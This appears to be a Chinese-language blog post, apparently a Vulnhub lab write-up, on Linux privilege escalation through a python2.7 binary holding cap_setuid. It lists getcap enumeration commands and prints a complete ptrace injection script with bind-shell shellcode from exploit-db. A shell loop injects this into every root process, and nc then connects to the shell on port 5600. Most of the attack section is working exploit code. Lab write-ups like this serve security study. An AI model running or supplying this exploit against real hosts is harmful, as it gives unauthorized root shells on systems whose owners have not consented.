+<h1><span id="capabilitie提权">Capabilitie提权</span></h1><p><img src="https://cdn.nlark.com/yuque/0/2023/png/22356351/1683883005929-c0001df5-fc98-41a8-9613-7babb9c0f3e6.png#averageHue=%23232632&clientId=u8ef56f46-65f9-4&from=paste&height=85&id=u3e10b089&originHeight=170&originWidth=1170&originalType=binary&ratio=2&rotation=0&showTitle=false&size=49365&status=done&style=none&taskId=ubbd5a159-79f4-49a4-af88-670d69b6e89&title=&width=585" alt="image.png"><br>但是把只是普通用户不是root 用户<br>尝试了suid 提权 <br>内核提权<br><img src="https://cdn.nlark.com/yuque/0/2023/png/22356351/1683883116191-1a40ce5f-e313-4398-b9ec-4c9f5c5da62e.png#averageHue=%23262934&clientId=u8ef56f46-65f9-4&from=paste&height=181&id=u1a40e929&originHeight=361&originWidth=1242&originalType=binary&ratio=2&rotation=0&showTitle=false&size=128779&status=done&style=none&taskId=ue765265f-31b0-4648-acab-895b01583ee&title=&width=621" alt="image.png"><br>都是没有的，<br>经过百度 Google 找到了可以使用Capabilitie提权<br>linux2.2之后,产生了Capabilities用于分隔<a target="_blank" rel="noopener" href="https://so.csdn.net/so/search?q=root%E6%9D%83%E9%99%90&spm=1001.2101.3001.7020">root权限</a>，以便于用户更好，更安全，更精细的管理机器的功能和权限。<br>先使用</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml">python3 -c &#x27;import pty;pty.spawn(&quot;/bin/bash&quot;)&#x27;<br></code></pre></td></tr></table></figure>
+<p>升级shell，<br>然后使用getcap工具查找是否存在CAP_SETUID标志的进程</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs xml">/usr/sbin/getcap -r /2&gt;/dev/null<br>/sbin/getcap -r / 2&gt;/dev/null<br></code></pre></td></tr></table></figure>
+<p>如果存在 &#x2F;usr&#x2F;bin&#x2F;python2.7&#x3D; cap_setuid+ep 就可能存在Capabilities提权<br><img src="https://cdn.nlark.com/yuque/0/2023/png/22356351/1683884048107-0018c0ce-fa2d-493e-b679-45946f8052ab.png#clientId=u8ef56f46-65f9-4&from=paste&height=93&id=u9f4c6e77&originHeight=185&originWidth=960&originalType=binary&ratio=2&rotation=0&showTitle=false&size=63687&status=done&style=none&taskId=u85b41399-00c3-4627-b923-243b8fda33d&title=&width=480" alt="image.png"><br>这里是存在的<br>使用python脚本进行提权</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># inject.py# The C program provided at the GitHub Link given below can be used as a reference for writing the python script.</span><br><span class="hljs-comment"># GitHub Link: https://github.com/0x00pf/0x00sec_code/blob/master/mem_inject/infect.c </span><br><br><span class="hljs-keyword">import</span> ctypes<br><span class="hljs-keyword">import</span> sys<br><span class="hljs-keyword">import</span> struct<br><br><span class="hljs-comment"># Macros defined in &lt;sys/ptrace.h&gt;</span><br><span class="hljs-comment"># https://code.woboq.org/qt5/include/sys/ptrace.h.html</span><br><br>PTRACE_POKETEXT   = <span class="hljs-number">4</span><br>PTRACE_GETREGS    = <span class="hljs-number">12</span><br>PTRACE_SETREGS    = <span class="hljs-number">13</span><br>PTRACE_ATTACH     = <span class="hljs-number">16</span><br>PTRACE_DETACH     = <span class="hljs-number">17</span><br><br><span class="hljs-comment"># Structure defined in &lt;sys/user.h&gt;</span><br><span class="hljs-comment"># https://code.woboq.org/qt5/include/sys/user.h.html#user_regs_struct</span><br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">user_regs_struct</span>(ctypes.Structure):<br>    _fields_ = [<br>        (<span class="hljs-string">&quot;r15&quot;</span>, ctypes.c_ulonglong),<br>        (<span class="hljs-string">&quot;r14&quot;</span>, ctypes.c_ulonglong),<br>        (<span class="hljs-string">&quot;r13&quot;</span>, ctypes.c_ulonglong),<br>        (<span class="hljs-string">&quot;r12&quot;</span>, ctypes.c_ulonglong),<br>        (<span class="hljs-string">&quot;rbp&quot;</span>, ctypes.c_ulonglong),<br>        (<span class="hljs-string">&quot;rbx&quot;</span>, ctypes.c_ulonglong),<br>        (<span class="hljs-string">&quot;r11&quot;</span>, ctypes.c_ulonglong),<br>        (<span class="hljs-string">&quot;r10&quot;</span>, ctypes.c_ulonglong),<br>        (<span class="hljs-string">&quot;r9&quot;</span>, ctypes.c_ulonglong),<br>        (<span class="hljs-string">&quot;r8&quot;</span>, ctypes.c_ulonglong),<br>        (<span class="hljs-string">&quot;rax&quot;</span>, ctypes.c_ulonglong),<br>        (<span class="hljs-string">&quot;rcx&quot;</span>, ctypes.c_ulonglong),<br>        (<span class="hljs-string">&quot;rdx&quot;</span>, ctypes.c_ulonglong),<br>        (<span class="hljs-string">&quot;rsi&quot;</span>, ctypes.c_ulonglong),<br>        (<span class="hljs-string">&quot;rdi&quot;</span>, ctypes.c_ulonglong),<br>        (<span class="hljs-string">&quot;orig_rax&quot;</span>, ctypes.c_ulonglong),<br>        (<span class="hljs-string">&quot;rip&quot;</span>, ctypes.c_ulonglong),<br>        (<span class="hljs-string">&quot;cs&quot;</span>, ctypes.c_ulonglong),<br>        (<span class="hljs-string">&quot;eflags&quot;</span>, ctypes.c_ulonglong),<br>        (<span class="hljs-string">&quot;rsp&quot;</span>, ctypes.c_ulonglong),<br>        (<span class="hljs-string">&quot;ss&quot;</span>, ctypes.c_ulonglong),<br>        (<span class="hljs-string">&quot;fs_base&quot;</span>, ctypes.c_ulonglong),<br>        (<span class="hljs-string">&quot;gs_base&quot;</span>, ctypes.c_ulonglong),<br>        (<span class="hljs-string">&quot;ds&quot;</span>, ctypes.c_ulonglong),<br>        (<span class="hljs-string">&quot;es&quot;</span>, ctypes.c_ulonglong),<br>        (<span class="hljs-string">&quot;fs&quot;</span>, ctypes.c_ulonglong),<br>        (<span class="hljs-string">&quot;gs&quot;</span>, ctypes.c_ulonglong),<br>    ]<br><br>libc = ctypes.CDLL(<span class="hljs-string">&quot;libc.so.6&quot;</span>)<br><br>pid=<span class="hljs-built_in">int</span>(sys.argv[<span class="hljs-number">1</span>])<br><br><span class="hljs-comment"># Define argument type and respone type.</span><br>libc.ptrace.argtypes = [ctypes.c_uint64, ctypes.c_uint64, ctypes.c_void_p, ctypes.c_void_p]<br>libc.ptrace.restype = ctypes.c_uint64<br><br><span class="hljs-comment"># Attach to the process</span><br>libc.ptrace(PTRACE_ATTACH, pid, <span class="hljs-literal">None</span>, <span class="hljs-literal">None</span>)<br>registers=user_regs_struct()<br><br><span class="hljs-comment"># Retrieve the value stored in registers</span><br>libc.ptrace(PTRACE_GETREGS, pid, <span class="hljs-literal">None</span>, ctypes.byref(registers))<br><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Instruction Pointer: &quot;</span> + <span class="hljs-built_in">hex</span>(registers.rip))<br><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Injecting Shellcode at: &quot;</span> + <span class="hljs-built_in">hex</span>(registers.rip))<br><br><span class="hljs-comment"># Shell code copied from exploit db.</span><br>shellcode=<span class="hljs-string">&quot;\x48\x31\xc0\x48\x31\xd2\x48\x31\xf6\xff\xc6\x6a\x29\x58\x6a\x02\x5f\x0f\x05\x48\x97\x6a\x02\x66\xc7\x44\x24\x02\x15\xe0\x54\x5e\x52\x6a\x31\x58\x6a\x10\x5a\x0f\x05\x5e\x6a\x32\x58\x0f\x05\x6a\x2b\x58\x0f\x05\x48\x97\x6a\x03\x5e\xff\xce\xb0\x21\x0f\x05\x75\xf8\xf7\xe6\x52\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x53\x48\x8d\x3c\x24\xb0\x3b\x0f\x05&quot;</span><br><br><span class="hljs-comment"># Inject the shellcode into the running process byte by byte.</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> xrange(<span class="hljs-number">0</span>,<span class="hljs-built_in">len</span>(shellcode),<span class="hljs-number">4</span>):<br><br>    <span class="hljs-comment"># Convert the byte to little endian.</span><br>    shellcode_byte_int=<span class="hljs-built_in">int</span>(shellcode[i:<span class="hljs-number">4</span>+i].encode(<span class="hljs-string">&#x27;hex&#x27;</span>),<span class="hljs-number">16</span>)<br>    shellcode_byte_little_endian=struct.pack(<span class="hljs-string">&quot;&lt;I&quot;</span>, shellcode_byte_int).rstrip(<span class="hljs-string">&#x27;\x00&#x27;</span>).encode(<span class="hljs-string">&#x27;hex&#x27;</span>)<br>    shellcode_byte=<span class="hljs-built_in">int</span>(shellcode_byte_little_endian,<span class="hljs-number">16</span>)<br><br>    <span class="hljs-comment"># Inject the byte.</span><br>    libc.ptrace(PTRACE_POKETEXT, pid, ctypes.c_void_p(registers.rip+i),shellcode_byte)<br><br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Shellcode Injected!!&quot;</span>)<br><br>    <span class="hljs-comment"># Modify the instuction pointer</span><br>    registers.rip=registers.rip+<span class="hljs-number">2</span><br><br>    <span class="hljs-comment"># Set the registers</span><br>    libc.ptrace(PTRACE_SETREGS, pid, <span class="hljs-literal">None</span>, ctypes.byref(registers))<br><br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Final Instruction Pointer: &quot;</span> + <span class="hljs-built_in">hex</span>(registers.rip))<br><br>    <span class="hljs-comment"># Detach from the process.</span><br>    libc.ptrace(PTRACE_DETACH, pid, <span class="hljs-literal">None</span>, <span class="hljs-literal">None</span>)<br><br></code></pre></td></tr></table></figure>
+<p>然后上传到 靶机上去 <br>可以使用这个脚本进行批量测试</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> `ps -ef|grep root|grep -v <span class="hljs-string">&quot;grep&quot;</span>|awk <span class="hljs-string">&#x27;&#123;print $2&#125;&#x27;</span>`; do python2<span class="hljs-number">.7</span> inject.py $i; done<br></code></pre></td></tr></table></figure>
+<p><img src="https://cdn.nlark.com/yuque/0/2023/png/22356351/1683884220980-137cb776-1c75-4ee0-8452-a0c17dc58b29.png#averageHue=%23232633&clientId=u8ef56f46-65f9-4&from=paste&height=139&id=ub7ae8f16&originHeight=277&originWidth=1042&originalType=binary&ratio=2&rotation=0&showTitle=false&size=98805&status=done&style=none&taskId=u2e086bd9-924e-4b5c-aa44-6058512c8e6&title=&width=521" alt="image.png"><br>查看5600 进程是否开启<br>netstat -ano | grep “5600”<br><img src="https://cdn.nlark.com/yuque/0/2023/png/22356351/1683884323854-f4e9a5ef-912b-4e0d-9f29-8854e09f2e6b.png#averageHue=%23242733&clientId=u8ef56f46-65f9-4&from=paste&height=43&id=u412a626c&originHeight=85&originWidth=792&originalType=binary&ratio=2&rotation=0&showTitle=false&size=18938&status=done&style=none&taskId=u3a7c22af-bb6d-4b43-af0a-b456914f7c7&title=&width=396" alt="image.png"><br>然后直接使用nc 连接就好了</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">nc <span class="hljs-number">0.0</span><span class="hljs-number">.0</span><span class="hljs-number">.0</span> <span class="hljs-number">5600</span><br></code></pre></td></tr></table></figure>
+<p><img src="https://cdn.nlark.com/yuque/0/2023/png/22356351/1683884847889-340a0307-1271-4213-87d6-9edfb9f6e0bb.png#averageHue=%23222533&clientId=u8ef56f46-65f9-4&from=paste&height=64&id=u1f1b24e2&originHeight=128&originWidth=741&originalType=binary&ratio=2&rotation=0&showTitle=false&size=24268&status=done&style=none&taskId=udcb50669-c4af-4341-8c3c-282b7004bb7&title=&width=370.5" alt="image.png"><br>成功提权到root</p>
+
+      </div>
+    </div>
+  </article>
+  <div class="post__foot">
+    
+    <div class="post-nav">
+  
+    <a class="post-nav-item-left" href="/2023/05/15/SPP%20%E5%8F%8D%E5%90%91%E4%BB%A3%E7%90%86%20-%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91/">
+      <div class="text-align">
+        <svg t="1670570876164"
+             class="icon"
+             viewBox="0 0 1024 1024"
+             width="16"
+             height="16">
+          <path d="M384 512L731.733333 202.666667c17.066667-14.933333 19.2-42.666667 4.266667-59.733334-14.933333-17.066667-42.666667-19.2-59.733333-4.266666l-384 341.333333c-10.666667 8.533333-14.933333 19.2-14.933334 32s4.266667 23.466667 14.933334 32l384 341.333333c8.533333 6.4 19.2 10.666667 27.733333 10.666667 12.8 0 23.466667-4.266667 32-14.933333 14.933333-17.066667 14.933333-44.8-4.266667-59.733334L384 512z" p-id="14596"/>
+        </svg>
+        <span class="text-small">上一篇</span>
+      </div>
+      <div>SPP端口转发-反向代理</div>
+    </a>
+  
+  <div class="vhr"></div>
+  
+    <a class="post-nav-item-right" href="/2023/05/10/ATT&CK%20(%E4%B8%80)/">
+      <div class="text-align">
+        <span class="text-small">下一篇</span>
+        <svg t="1670570876164"
+             class="icon"
+             viewBox="0 0 1024 1024"
+             transform="scale(-1,-1)"
+             width="16"
+             height="16">
+          <path d="M384 512L731.733333 202.666667c17.066667-14.933333 19.2-42.666667 4.266667-59.733334-14.933333-17.066667-42.666667-19.2-59.733333-4.266666l-384 341.333333c-10.666667 8.533333-14.933333 19.2-14.933334 32s4.266667 23.466667 14.933334 32l384 341.333333c8.533333 6.4 19.2 10.666667 27.733333 10.666667 12.8 0 23.466667-4.266667 32-14.933333 14.933333-17.066667 14.933333-44.8-4.266667-59.733334L384 512z" p-id="14596"/>
+        </svg>
+      </div>
+      ATT&CK红队评估(一)
+    </a>
+  
+</div>
+
+    
+      <div class="related-post">
+  <div class="related__head">
+  <a href="/tags/vulnhub/" class="post-tag">#vulnhub</a><a href="/tags/%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/" class="post-tag">#漏洞利用</a><a href="/tags/Capabilitie%E6%8F%90%E6%9D%83/" class="post-tag">#Capabilitie提权</a>
+
+</div>
+  <div class="realated__body">
+    
+      DEBUG: 请安装插件 <a target="_blank" rel="noopener" href="https://github.com/tea3/hexo-related-popular-posts">hexo-related-popular-posts</a> 或关闭 related_post 配置!
+    
+  </div>
+</div>
+
+    
+    
+  </div>
+
+    </div>
+    <div class="foot">
+      <div class="foot-inner">
+        <div class="foot__head">
+          
+            <div class="foot-line">
+              
+                <div class="matts">浮</div>
+              
+                <div class="matts">云</div>
+              
+                <div class="matts">游</div>
+              
+                <div class="matts">子</div>
+              
+                <div class="matts">意</div>
+              
+            </div>
+          
+            <div class="foot-line">
+              
+                <div class="matts">落</div>
+              
+                <div class="matts">日</div>
+              
+                <div class="matts">故</div>
+              
+                <div class="matts">人</div>
+              
+                <div class="matts">情</div>
+              
+            </div>
+          
+        </div>
+        <div class="foot__body">
+          
+          
+            <div class="foot-item">
+              <div class="foot-item__head">账号</div>
+              <div class="foot-item__body">
+                
+                  <div class="text">
+                    <img alt="link" height="20px" width="20px" src="/images/logo-github.svg"/>
+                    <a class="foot-link" target="_blank" rel="noopener" href="https://github.com/x0blank">github</a>
+                  </div>
+                
+              </div>
+            </div>
+          
+          <div class="foot-item">
+            <div class="foot-item__head">联系</div>
+            <div class="foot-item__body">
+              <div class="text">
+                <img alt="link" height="20px" width="20px" src="/images/icon/icon-email.svg"/>
+                <a class="foot-link" href="mailto:chenxiaolong592@gmail.com">chenxiaolong592@gmail.com</a>
+              </div>
+            </div>
+          </div>
+        </div>
+        <div class="copyright">
+          <a href="http://example.com">Blanks'Blog</a> &nbsp;|&nbsp;由&nbsp;<a target="_blank" rel="noopener" href="https://hexo.io/">Hexo</a>&nbsp;及&nbsp;
+          <svg width="20" height="20" viewBox="0 0 725 725">
+            <path fill-rule="evenodd" fill="rgb(221, 221, 221)" d="M145.870,236.632 L396.955,103.578 L431.292,419.44 L156.600,522.53 L145.870,236.632 Z"/>
+            <path fill-rule="evenodd" fill="rgb(159, 159, 159)" d="M396.955,103.578 L564.345,234.486 L611.558,513.469 L431.292,419.44 L396.955,103.578 Z"/>
+            <path fill-rule="evenodd" fill="rgb(0, 0, 0)" d="M431.292,419.44 L611.558,513.469 L358.327,595.18 L156.600,522.53 L431.292,419.44 Z"/>
+          </svg>
+          <a target="_blank" rel="noopener" href="https://github.com/hooozen/hexo-theme-tranquility">致远</a>&nbsp;驱动
+        </div>
+      </div>
+    </div>
+    
+    
+  
+
+  </body>
+</html>
